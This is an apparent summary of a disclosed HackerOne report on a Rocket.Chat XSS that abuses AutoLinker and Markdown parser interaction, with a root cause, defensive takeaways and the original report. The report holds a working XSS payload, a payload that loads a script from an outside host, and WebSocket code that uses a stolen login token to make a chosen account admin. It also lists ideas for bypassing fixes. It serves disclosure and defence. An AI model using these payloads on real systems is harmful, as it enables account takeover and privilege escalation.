# Account Takeover via XSS in Rocket.Chat through AutoLinker and Markdown Parser Bypass

## Metadata
- **Source:** HackerOne
- **Report:** 735638 | https://hackerone.com/reports/735638
- **Submitted:** 2019-11-11
- **Reporter:** sectex
- **Program:** Rocket.Chat
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Cross-Site Scripting (XSS), HTML Attribute Injection, Parser Logic Error, Account Takeover
- **CVEs:** None
- **Category:** web-api

## Summary
A critical XSS vulnerability exists in Rocket.Chat where the AutoLinker and Markdown parsers can be combined to break out of HTML attributes and inject malicious event handlers. An attacker can craft a message containing specially crafted Markdown with animation events to execute arbitrary JavaScript in a victim's browser, stealing their authentication token and compromising their account.

## Attack scenario
1. Attacker crafts a malicious message combining Markdown link syntax with HTML attributes: `https://a?p=[ ](https:// style=animation-duration:1s onanimationiteration=PAYLOAD ...)`
2. The AutoLinker parser processes the URL and creates an anchor tag, while the Markdown parser processes the link syntax
3. Parser interaction causes attribute injection, breaking out of the href attribute and injecting onanimationiteration event handler
4. When the victim views the message, the animation triggers and the event handler executes, evaluating arbitrary JavaScript via Symbol.hasInstance prototype pollution trick
5. JavaScript payload extracts the victim's Meteor.loginToken from localStorage or document.cookies
6. Attacker uses stolen token to authenticate via WebSocket and perform unauthorized actions (password change, email update, privilege escalation to admin)

## Root cause
The Markdown parser and AutoLinker have insufficient input validation and sanitization. They fail to properly escape special characters when processing URLs containing complex attribute syntax. The parsers do not coordinate to prevent attribute injection, allowing an attacker to break out of the href context and inject HTML attributes and event handlers. Additionally, the onanimationiteration event handler is not filtered, and JavaScript evaluation via Symbol.hasInstance prototype manipulation bypasses basic XSS defenses.

## Attacker mindset
Sophisticated attacker combining multiple parsing logic quirks. The use of animation events and Symbol.hasInstance demonstrates knowledge of HTML5 event handling and JavaScript prototype manipulation to bypass XSS filters. The attacker aims for complete account compromise and privilege escalation to administrative levels by stealing authentication tokens and leveraging WebSocket API for unauthorized operations.

## Defensive takeaways
- Implement strict output encoding/escaping for all user-generated content before rendering in HTML context, particularly for URL attributes
- Use a single, well-tested HTML sanitizer library (e.g., DOMPurify) rather than relying on multiple parsers with unclear interaction
- Implement Content Security Policy (CSP) to prevent inline script execution and restrict event handler attributes
- Sanitize and validate URLs before processing through AutoLinker; reject URLs with suspicious attribute-like patterns
- Apply allowlist-based approach for HTML attributes and event handlers in Markdown and link processors
- Implement authentication token rotation and short expiration times; avoid storing sensitive tokens in localStorage
- Add WebSocket message validation and rate limiting to prevent automated account manipulation
- Conduct thorough security testing of parser interactions and edge cases where multiple processing layers could interfere
- Implement proper Content Security Policy headers to block inline event handlers and eval()

## Variant hunting
Test other event handlers (onload, onerror, onmouseover) combined with animation/transition CSS events
Fuzz AutoLinker with various URL protocols and special characters to find other attribute breakout vectors
Test interaction between Markdown parser and other input filters (mention processor, emoji parser, etc.)
Research other prototype pollution techniques beyond Symbol.hasInstance for JavaScript code execution
Test if similar vulnerabilities exist in desktop client where arbitrary file read and RCE are possible
Attempt to bypass any implemented fixes by using Unicode escaping, HTML entities, or encoding variations
Test mutation XSS (mXSS) by analyzing how parsed content is re-rendered or modified by subsequent operations

## MITRE ATT&CK
- T1190
- T1566
- T1598
- T1185
- T1056
- T1110

## Notes
This vulnerability is particularly severe because it affects authenticated users, allows token theft leading to complete account takeover, and can escalate privileges to admin level. The desktop client variants allow even more severe exploitation (arbitrary file read, RCE). The use of WebSocket authentication with stolen tokens bypasses typical session-based CSRF protections. The vulnerability demonstrates the dangers of complex parser interactions and the importance of unified sanitization strategies.

## Full report
<details><summary>Expand</summary>

**Summary:** By combining AutoLinker and Markdown an attacker is able to inject malicious scripts.

**Description:** By combining AutoLinker and Markdown we can trick the parser into breaking out of the current HTML attribute. 
```
https://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'alert\x28\x27XSS\x27\x29;'instanceof[] target=_blank data-x=`.`)
```
results in:
```html
<a href="https://a?p=<a href=" https:="" style="animation-duration:1s;animation-name:blink;animation-iteration-count:2" onanimationiteration="Array.prototype[Symbol.hasInstance]=eval,'alert\x28\x27XSS\x27\x29;'instanceof[]" target="_blank" data-x="<span" class="copyonly">`<span><code class="code-colors inline">.</code></span><span class="copyonly">`</span>" target="_blank" rel="noopener noreferrer"&gt; </a>
" target="_blank" rel="noopener noreferrer"&gt;https://a?p==!=7vrXTtDtYHrLJ4Z7y=!="
```

To obtain the login-token of the victim we can either use `document.cookie` or `localStorage.getItem('Meteor.loginToken')`.
Since we can authenticate against the websocket using this token, we can perform any actions in the context of the victim (change password, email etc.).

## Releases Affected:

  * Rocket.Chat-Desktop-Client: v2.16.2
  * Rocket.Chat-Server: v2.0.0
  * Apps-Engine-Version: v1.5.2

## Steps To Reproduce (from initial installation to vulnerability):

In this example, the role `admin` is assigned to the desired user as far as the victim has the required permissions.

Code (replace `{ATTACKER_USERID}` and `{ATTACKER_EMAIL}`):
```javascript
    let ws = new WebSocket(`wss://${window.location.host}/sockjs/111/evilwss/websocket`);
    ws.onmessage = function (evt) {
        if (/\["{\\"msg\\":\\"pong\\"}"\]/.test(event.data)) {
            ws.send('["{\\"msg\\":\\"pong\\"}"]');
        }
        if (/a\["{\\"server_id\\":\\"(.*)\\"}"\]/.test(event.data)) {
            ws.send('["{\\"msg\\":\\"connect\\",\\"version\\":\\"1\\",\\"support\\":[\\"1\\",\\"pre2\\",\\"pre1\\"]}"]');
            ws.send(`["{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"resume\\":\\"${localStorage.getItem('Meteor.loginToken')}\\"}],\\"id\\":\\"1\\"}"]`);
        }
        if (/a\["{\\"msg\\":\\"connected\\",\\"session\\":\\"(.*)\\"}"\]/.test(event.data)) {
            ws.send('["{\\"msg\\":\\"method\\",\\"method\\":\\"insertOrUpdateUser\\",\\"params\\":[{\\"_id\\":\\"{ATTACKER_USERID}\\",\\"statusText\\":\\"\\",\\"email\\":\\"{ATTACKER_EMAIL}\\",\\"verified\\":false,\\"password\\":\\"\\",\\"requirePasswordChange\\":false,\\"joinDefaultChannels\\":false,\\"sendWelcomeEmail\\":false,\\"roles\\":[\\"user\\",\\"admin\\"]}],\\"id\\":\\"17\\"}"]');
        }
    };
```
Payload (replace `sectex.dev\x2ffiles\x2fcswsh.js`):
```
https://a?p=[ ](https:// style=animation-duration:1s;animation-name:blink;animation-iteration-count:2 onanimationiteration=Array.prototype[Symbol.hasInstance]=eval,'s=document.createElement\x28\x27script\x27\x29;s.src=\x27\x68\x74\x74\x70\x73\x3a\x2f\x2fsectex.dev\x2ffiles\x2fcswsh.js\x27;document.body.appendChild\x28s\x29;'instanceof[] target=_blank data-x=`.`)
```

## Supporting Material/References:

  * {F631806}

## Suggested mitigation

  * Fix initial XSS

## Impact

* Attackers can execute scripts which can lead to:
    * Account takeover
    * Abitrary file read in Rocket.Chat-Desktop
    * RCE in Rocket.Chat-Desktop (#276031)

</details>

---
*Analysed by Claude on 2026-05-12*
